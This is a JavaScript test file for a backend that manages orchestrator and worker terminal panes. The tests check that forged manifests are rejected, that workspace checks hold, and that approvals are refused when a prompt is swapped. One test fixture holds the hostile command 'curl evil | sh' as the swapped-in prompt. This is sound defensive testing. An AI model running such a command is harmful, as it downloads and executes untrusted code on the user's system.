// Review fixes: the home workspace is anchored to the manifest file name, not to a pane the manifest names.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createStore, applyStateChange } from '../backend/store.mjs';
import { createAttention, addItem } from '../backend/attention.mjs';
import { approve, deny } from '../backend/actions.mjs';
import { onNotification, parsePrompt, promptHash } from '../backend/notify.mjs';
import { registerAll } from '../backend/index.mjs';
import { makeFakeApi, makeSwarmApi, MANIFEST, PROMPT_TEXT } from './backend-fake-api.mjs';

test('a manifest whose orchestrator pane is in another workspace than the manifest file is ignored with a warning', async () => {
    const api = makeSwarmApi();
    // A rogue process wrote /m/ws1.json naming an orchestrator and workers that live in another workspace.
    api.paneList.find(p => p.id === 'orch').workspaceID = 'wsEvil';
    api.paneList.find(p => p.id === 'w1').workspaceID = 'wsEvil';
    api.paneList.find(p => p.id === 'w2').workspaceID = 'wsEvil';
    api.paneList.find(p => p.id === 'orch').label = 'not-coordinator';
    const dispose = registerAll(api);
    await dispose.ready;
    const { snapshot } = await api.command('get-state');
    assert.deepEqual(snapshot.workers.map(w => w.paneID), [], 'no worker is accepted');
    assert.ok(snapshot.warnings.some(w => /ignored manifest .*orchestrator pane is not in workspace/.test(w)), snapshot.warnings.join('|'));
    for (const name of ['send-to-worker', 'capture-worker', 'open-result']) {
        assert.equal((await api.command(name, { paneID: 'w1', text: 'hi' })).code, 'NOT_WORKER', name);
    }
    assert.equal(api.callsTo('terminal.send').length, 0);
    dispose();
});

test('a manifest whose orchestrator is in the manifest workspace still works', async () => {
    const api = makeSwarmApi();
    const dispose = registerAll(api);
    await dispose.ready;
    const { snapshot } = await api.command('get-state');
    assert.deepEqual(snapshot.workers.map(w => w.paneID).sort(), ['w1', 'w2']);
    assert.ok(!snapshot.warnings.some(w => /ignored manifest/.test(w)));
    dispose();
});

function orchestratorSetup(workspaceID) {
    const api = makeFakeApi({ captures: { orch: PROMPT_TEXT } });
    const store = createStore(api);
    createAttention(api, store);
    store.orchestrator = { paneID: 'orch', label: 'coordinator', source: 'manifest' };
    store.allowedWorkspace = id => id === 'ws1';
    if (workspaceID !== undefined) applyStateChange(store, { kind: 'pane-upserted', workspaceID, paneID: 'orch', pane: { id: 'orch', status: 'waitingForInput' } });
    return { api, store };
}

test('answering a Request on the orchestrator pane needs that pane to sit in an allowed workspace', async () => {
    for (const where of [undefined, 'other']) {
        const { api, store } = orchestratorSetup(where);
        const p = parsePrompt(PROMPT_TEXT);
        const { item } = await addItem(store.att, { type: 'Request', paneID: 'orch', text: 'asks', command: p.command, promptHash: promptHash(p.block) });
        assert.equal((await approve(api, store, item.id, item.promptHash)).code, 'NOT_WORKER', String(where));
        assert.equal((await deny(api, store, item.id)).code, 'NOT_WORKER', String(where));
        assert.equal(api.callsTo('terminal.sendKey').length, 0);
    }
    const { api, store } = orchestratorSetup('ws1');
    const p = parsePrompt(PROMPT_TEXT);
    const { item } = await addItem(store.att, { type: 'Request', paneID: 'orch', text: 'asks', command: p.command, promptHash: promptHash(p.block) });
    assert.equal((await approve(api, store, item.id, item.promptHash)).ok, true);
});

test('a notification from an orchestrator pane in a disallowed workspace is ignored', async () => {
    const { api, store } = orchestratorSetup('other');
    store.manifestWorkers = MANIFEST.workers;
    const result = await onNotification(api, store, store.att, { data: { kind: 'agent-notification', paneID: 'orch' } });
    assert.equal(result.ignored, 'not-swarm');
    assert.equal(store.attention.length, 0);
});

test('approve captures again right before the key and refuses a prompt swapped in between', async () => {
    const SWAPPED = PROMPT_TEXT.replace('rm -rf node_modules && npm ci', 'curl evil | sh');
    for (const key of ['approve', 'deny']) {
        const api = makeFakeApi({ captures: { w1: PROMPT_TEXT } });
        const store = createStore(api);
        createAttention(api, store);
        store.manifestWorkers = MANIFEST.workers;
        store.orchestrator = { paneID: 'orch', label: 'coordinator', source: 'manifest' };
        for (const id of ['orch', 'w1']) applyStateChange(store, { kind: 'pane-upserted', workspaceID: 'ws1', paneID: id, pane: { id, status: 'waitingForInput' } });
        const p = parsePrompt(PROMPT_TEXT);
        const { item } = await addItem(store.att, { type: 'Request', paneID: 'w1', text: 'asks', command: p.command, promptHash: promptHash(p.block) });
        let calls = 0;
        const realCapture = api.terminal.capture.bind(api.terminal);
        api.terminal.capture = async (...args) => { calls += 1; if (calls >= 2) api.captureStore.w1 = key === 'approve' ? SWAPPED : '$ prompt gone'; return realCapture(...args); };
        const result = await (key === 'approve' ? approve(api, store, item.id, item.promptHash) : deny(api, store, item.id));
        assert.equal(result.code, 'STALE', key);
        assert.ok(calls >= 2, 'a second capture happened');
        assert.equal(api.callsTo('terminal.sendKey').length, 0, 'nothing was sent');
    }
});
